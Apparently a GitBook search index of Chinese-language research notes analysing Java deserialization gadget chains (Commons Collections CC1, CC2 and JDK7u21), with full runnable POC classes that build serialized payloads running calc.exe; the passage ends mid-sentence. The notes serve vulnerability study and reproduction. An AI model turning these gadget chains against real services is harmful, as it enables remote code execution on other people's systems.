{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction 记录自己的研究心得，涉及以下内容： 云原生安全 Java及其框架CVE研究和复现 内网渗透 文献阅读 注：部分文章因渲染失败上传markdown文件，可到仓库查阅 How to build a GitBook? 安装nvm，找到nvm的安装路径 where nvm 或 which nvm 在settings.txt处添加国内源 node_mirror: https://npm.taobao.org/mirrors/node/ npm_mirror: https://npm.taobao.org/mirrors/npm/ 再通过管理员下载对应的nodejs版本并启用 nvm install v10.23.0 nvm use v10.23.0 下载gitbook npm install gitbook-cli -g 初始化gitbook gitbook init 配置SUMMARY.md，书籍的目录结构在这里配置，最后建立gitbook gitbook build "},"javanote/CommonsCollections逐步分析.html":{"url":"javanote/CommonsCollections逐步分析.html","title":"CommonsCollections逐步分析","keywords":"","body":"CommonsCollections逐步分析 从零开始记录CC链的构造 对于 InvokerTransformer 的理解 参考: https://xz.aliyun.com/t/7031#toc-4 https://xz.aliyun.com/t/4711#toc-3 https://mp.weixin.qq.com/s/gZbcdS0TbAetZwVMyjkGWQ 以 Transformer[] 作为接口的类, Transformer 定义了 transform 方法 public Object transform(Object input) public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) public ChainedTransformer(Transformer[] transformers) 看到 InvokerTransformer 中的 transform 方法 public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException var6) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException var7) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); } } } 注意到input.getClass()这个方法使用上的一些区别： 当input是一个类的实例对象时，获取到的是这个类 当input是一个类时，获取到的是java.lang.Class 我们无法用 Runtime.class 去凭空得到 Runtime 类从而找到 exec, 只能通过反射机制调用反射机制获取到 getRuntime 方法 Object a = Runtime.getRuntime(); Class b = Runtime.class; System.out.println(a.getClass());//class java.lang.Runtime System.out.println(b.getClass());//class java.lang.Class 我们的最终目的是执行 Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\") 反射中所使用的方法 @CallerSensitive public Method getMethod(String paramString, Class... paramVarArgs) public Object invoke(Object paramObject, Object... paramVarArgs) public Process exec(String command) 先来获取getRuntime类 //目标语句 Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\") //使用java.lang.Class开头 Class.forName(\"java.lang.Class\").getMethod(\"getMethod\", new Class[] {String.class, Class[].class }) .invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]); //invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数 对照着InvokerTransformer类转变为transformers格式 Class cls = input.getClass();//cls = java.lang.Class Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod方法 return method.invoke(input, this.iArgs); //在Runtime中找getRuntime方法，并返回这个方法 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), //还需要填充 调用getRuntime得到Runtime实例, new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[] {\"calc.exe\"}) }; 还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照 //input=getRuntime这个方法 Class cls = input.getClass();//cls = java.lang.Method（getRuntime方法是method类） Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method类中找到invoke方法，method=invoke方法 return method.invoke(input, this.iArgs); //调用invoke方法，input=getRuntime这个方法，传入自定义的参数 以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。 首先this.iMethodName, this.iParamTypes是根据invoke接口而定的： public Object invoke(Object obj, Object... args) //this.iMethodName=\"invoke\" //this.iParamTypes=new Class[] {Object.class, Object[].class } //外面class、Object封装是InvokerTransformer类的构造函数要求 按照invoke中的input才是它要调用的环境的准则。 invoke方法.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)， 而input=getRuntime方法，那么只要填入this.iArgs就好了 又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。 this.iArgs=null,new Object[0] 整合如下: Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), }; CC1_TransformedMap 适用版本：3.1-3.2.1，jdk1.8以前 关于类 AnnotationInvocationHandler 中 this.type 赋值问题 网络上很多分析文章将 this.type 设置成 java.lang.annotation.Retention.class ，但是没有说为什么这个类可以。而在调试代码的过程中，我发现这个问题和注解类中有无定义方法有关。只有定义了方法的注解才能触发 POC 。例如 java.lang.annotation.Retention、java.lang.annotation.Target 都可以触发，而 java.lang.annotation.Documented 则不行。而且我们 POC 中， innermap 必须有一个键名与注解类方法名一样的元素。而注解类方法返回类型将是 clazz 的值。 POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC1_TransformedMap { public static void main(String[] args) throws Exception { //1. 客户端构建攻击代码 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), //隐蔽了启动进程的日志特征 new ConstantTransformer(1) }; //将transformers数组存入ChaniedTransformer这个继承类 ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); //创建Map并绑定chainedTransformer Map innerMap = new HashMap(); innerMap.put(\"value\", \"key\"); //给予Map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer); //在jdk1.7中就存在一个完美的readobject复写点的类sun.reflect.annotation.AnnotationInvocationHandler //反射机制调用AnnotationInvocationHandler类的构造函数 Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //取消构造函数修饰符限制 constructor.setAccessible(true); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); //获取AnnotationInvocationHandler类实例 Target, Retention (接口中有value方法规则影响var4的赋值) // Object cc1 = constructor.newInstance(Target.class, outerMap); Object cc1 = constructor.newInstance(Retention.class, outerMap); // 字节调用写法 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(cc1); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // 写文件写法 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(cc1); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); // Map转换链触发测试 // FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); // ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); // objectOutputStream.writeObject(outerMap); // FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); // ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); // Map outerMap_now = (Map) objectInputStream.readObject(); //2.1 可以直接map添加新值，触发漏洞 // outerMap_now.put(\"ricky\", \"test\"); //2.2 也可以获取map键值对，修改value，value为value，foobar,触发漏洞 // Map.Entry onlyElement = (Map.Entry)outerMap_now.entrySet().iterator().next(); // onlyElement.setValue(\"ricky\"); } } CC1_LazyMap 适用版本：3.1-3.2.1，jdk1.8以前 LazyMap调用 public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\"Factory must not be null\"); } this.factory = factory; } public Object get(Object key) { if (!super.map.containsKey(key)) { //此处触发transform方法 Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } Proxy动态代理 {@code InvocationHandler} is the interface implemented by the invocation handler of a proxy instance. Each proxy instance has an associated invocation handler. When a method is invoked on a proxy instance, the method invocation is encoded and dispatched to the {@code invoke} method of its invocation handler. 每一个动态代理类的调用处理程序都必须实现InvocationHandler接口，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现InvocationHandler接口类的invoke方法来调用 定义方式 public static Object newProxyInstance(ClassLoader loader, Class[] interfaces, InvocationHandler h) POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1_LazyMap { public static void main(String[] args) throws Exception { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); // CommonsCollections 4.0, LazyMap 不存在 decorate 方法 // Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap); Map ProxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); Object cc1 = constructor.newInstance(Retention.class, ProxyMap); // 字节调用写法 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(cc1); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // 写文件写法 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(cc1); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } 利用TemplatesImpl加载字节码 JDK7u21的理解 参考: https://www.anquanke.com/post/id/222630 https://lalajun.github.io/2019/11/30/JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets%207u21/ https://xz.aliyun.com/t/8050 _tfactory 看一个师傅的文章说是在defineTransletClasses()时会调用getExternalExtensionsMap(),当为null时会报错，所以要对_tfactory 设值。但是我在查询的时候并未看到getExternalExtensionsMap方法，而且在yso里面将设置_tfactory 值的代码给注释了一样能正常执行命令。 在其它师傅下找到的代码, 如果此处 return 如下所示则需要为 _tfactory 赋值 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { // setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); ... 还有对于 _auxClasses 的赋值其实也没必要考虑, 注释掉一样可以命令执行. 动态代理机制 其次就是动态代理机制, 通过创建AnnotationInvocationHandler对象实例, Proxy代理触发Map中的方法进而调用AnnotationInvocationHandler中的invoke方法 public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") && var5.length == 1 && var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else { assert var5.length == 0; if (var4.equals(\"toString\")) { return this.toStringImpl(); } else if (var4.equals(\"hashCode\")) { return this.hashCodeImpl(); } else if (var4.equals(\"annotationType\")) { return this.type; } else { Object var6 = this.memberValues.get(var4); if (var6 == null) { throw new IncompleteAnnotationException(this.type, var4); } else if (var6 instanceof ExceptionProxy) { throw ((ExceptionProxy)var6).generateException(); } else { if (var6.getClass().isArray() && Array.getLength(var6) != 0) { var6 = this.cloneArray(var6); } return var6; } } } } 在invoke方法中，如果传入的方法名是equals而且方法的参数列表只有一个Object对象的时候，就可以进入equalsImpl()方法 if (var4.equals(\"equals\") && var5.length == 1 && var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else { assert var5.length == 0; 跟进equalsImpl()方法 private Boolean equalsImpl(Object var1) { /*在这里可以看到获取到2个方法。在后面还可以看到一个for循环，然后会遍历var2的值。然后下面使用var8 = var5.invoke(var1); 反射去调用，这里传入的var1是TemplatesImpl的实例对象。*/ if (var1 == this) { return true; } else if (!this.type.isInstance(var1)) { return false; } else { Method[] var2 = this.getMemberMethods(); int var3 = var2.length; for(int var4 = 0; var4 前两个if不用管，直接看else。通过getMemberMethods得到一个Method[]： private Method[] getMemberMethods() { if (this.memberMethods == null) { this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction() { public Method[] run() { Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods(); AccessibleObject.setAccessible(var1, true); return var1; } }); } return this.memberMethods; 然后进入for循环，遍历这个Method[]，然后调用方法 if (var9 != null) { var8 = var9.memberValues.get(var6); 这里的Method[]只能是通过this.type来得到 Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods(); //在这里的this.type是templates对象，使用getDeclaredMethods反射获取方法 因为memberMethods属性是个瞬态属性不可控。 private transient volatile Method[] memberMethods = null; 总的来说可以利用的就是，得到this.type的所有Method[]，然后依次调用所有。如果让this.type是TemplatesImpl的类的话，就自然会调用到newTransformer或者getOutputProperties。而invoke的那个参数var1也就是调用方法的对象了，所以var1需要是我们构造的恶意的TemplatesImpl对象 触发getOutputProperties方法后进而到newTransformer方法 public synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } 通过getTransletInstance方法进而执行静态块, 静态块执行的步骤参考CC2链的跟进 LinkedHashSet jdk7u21主要的精华之处在于找equals和另一个hash值的构造 public V put(K key, V value) { // key只要赋值就可以绕过此if if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry e = table[i]; e != null; e = e.next) { Object k; // 如果key赋值为TemplatesImpl对象，前面做了一个动态代理，这里调用key.equals就会触发到AnnotationInvocationHandler的invoke方法 if (e.hash == hash && ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; } 计算hash值的流程可以简化为 int hash = hash(key); int i = indexFor(hash, table.length); int h = 0; h ^= k.hashCode(); h ^= (h >>> 20) ^ (h >>> 12); h ^ (h >>> 7) ^ (h >>> 4); h & 15; 最后的return h & (length-1);是h&15，是因为HashMap的默认length是16 /** * The default initial capacity - MUST be a power of two. */ static final int DEFAULT_INITIAL_CAPACITY = 16; 从整个流程来看，想控制hash的话，就是要让代理对象的hashCode()和TemplatesImpl对象的hashCode()相同。但是TemplatesImpl的hashCode()是个Native()方法，每次运行都会改变，所以不可控。 再想想代理对象的hashCode()。很明显也得经过invoke，进入hashCodeImpl // HashMap通过 k.hashCode 触发 AnnotationInvocationHandler 的invoke方法进而触发其hashCode else if (var4.equals(\"hashCode\")) { return this.hashCodeImpl(); } ... private int hashCodeImpl() { int var1 = 0; Entry var3; for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) { var3 = (Entry)var2.next(); } return var1; } 简单来说就是遍历this.memberValues这个Map，把每次计算出来的127*(key的hash)^(value的hash) , 作者的思路: 让memberValues这个Map只有一个键值对，让key的hash为0，这样127*0=0，然后0^xxx仍然是xxx（相同为0，不同为1）。再让value是恶意的TemplatesImpl对象，这样计算的就是那个TemplatesImpl对象的hash值，自然就相同了 至于hash为0的键，通过爆破找到的是f5a5a608 public static void bruteHashCode() { for (long i = 0; i 为什么使用LinkedHashSet? LinkedHashSet 是 Set 的一个具体实现，其维护着一个运行于所有条目的双重链接列表。此链接列表定义了迭代顺序，该迭代顺序可为插入顺序或是访问顺序。 LinkedHashSet 继承与 HashSet，并且其内部是通过 LinkedHashMap 来实现的。有点类似于我们之前说的LinkedHashMap 其内部是基于 Hashmap 实现一样，不过还是有一点点区别的（具体的区别大家可以自己去思考一下）。 如果我们需要迭代的顺序为插入顺序或者访问顺序，那么 LinkedHashSet 是需要你首先考虑的。 因此利用LinkedHashSet就可以实现次序可控。 POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.LinkedHashSet; import java.util.Map; public class jdk7u21_self { public static void main(String[] args) throws Exception{ // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); // setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); String zeroHashCodeStr = \"f5a5a608\"; HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor handlerConstructor = clazz.getDeclaredConstructor(Class.class, Map.class); handlerConstructor.setAccessible(true); InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map); setFieldValue(tempHandler, \"type\", Templates.class); Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]{Templates.class}, tempHandler); LinkedHashSet set = new LinkedHashSet(); // maintain order set.add(templates); set.add(proxy); // setFieldValue(templates, \"_auxClasses\", null); setFieldValue(templates, \"_class\", null); map.put(zeroHashCodeStr, templates); // swap in real object ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(set);//序列化对象 objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流 ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC2_TemplatesImpl 适用版本：commons-collections-4.0, jdk7u21及以前 参考: https://blog.csdn.net/qq_41918771/article/details/117194343 最终序列化为PriorityQueue类, 从其readObject开始 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i queue值和size值被我们改过, 所以for循环那一块的size值为2, for循环结束后跟进heapify方法 private void heapify() { // 这一块size为2即10,右移减一等于0即可进入for循环 for (int i = (size >>> 1) - 1; i >= 0; i--) siftDown(i, (E) queue[i]); } 继续跟进siftDown方法 private void siftDown(int k, E x) { if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); } 设置了comparator的值, 跟进if语句中的siftDownUsingComparator方法 private void siftDownUsingComparator(int k, E x) { int half = size >>> 1; while (k 0) c = queue[child = right]; if (comparator.compare(x, (E) c) 关键代码在 comparator.compare, 这里的comparator是TransformingComparator实例化的对象，而变量x是queue[0]，因为在heapify函数中是依次循环的，而queue[0]是exp中的templates 进入compare方法就到了熟悉的嵌套调用环节, this.transformer赋值为InvokerTransformer, 所以调用到其transform方法 跟进InvokerTransformer类的transform方法 这里的各个变量赋值详细说明一下: input: TemplatesImpl类 cls: 获取到TemplatesImpl对象 iMethodName: newTransformer方法 iParamTypes: null 跟进TemplatesImpl中的newTransformer方法 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 跟进getTransletInstance方法 private Translet getTransletInstance() throws TransformerConfigurationException { try { // 设置_name属性绕过该if语句 if (_name == null) return null; // 设置_class为null进入defineTransletClasses方法 if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 跟进 defineTransletClasses 方法 private void defineTransletClasses() throws TransformerConfigurationException { //存在_bytecodes绕过此if语句 if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount > 1) { _auxClasses = new Hashtable(); } for (int i = 0; i 赋值给_transletIndex后，_class[_transletIndex].newInstance();才会执行我们恶意的static代码块 // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them // JVM在加载类时在main方法之前执行静态块 AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2_Templat { public static void main(String[] args) throws Exception{ // 反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为\"newTransformer\" Class clazz = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\"); Constructor constructor = clazz.getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer invokerTransformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); // 实例化一个TransformingComparator对象，并且传入了invokerTransformer，需要注意TransformingComparator中的compare方法 TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer); // 实例化PriorityQueue对象 PriorityQueue priorityQueue = new PriorityQueue(1); // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; // 实例化TemplatesImpl对象 TemplatesImpl templates = TemplatesImpl.class.newInstance(); // 通过反射设置字段的值为二维字节数组 setFieldValue(templates, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); // 新建一个对象数组 Object[] queueArray = new Object[]{templates, 1}; // 反射设置PriorityQueue的queue值 Field queueField = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queueField.setAccessible(true); queueField.set(priorityQueue, queueArray); // 反射设置PriorityQueue的size值 Field queueSize = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); queueSize.setAccessible(true); queueSize.set(priorityQueue, 2); // 反射设置PriorityQueue的comparator值 Field queueComparator = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); queueComparator.setAccessible(true); queueComparator.set(priorityQueue, transformingComparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(priorityQueue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 🚩对_tfacroty的再次理解 研究到jackson的触发问题再回来看这个_tfactory的作用, jdk1.7下该属性是不存在的, 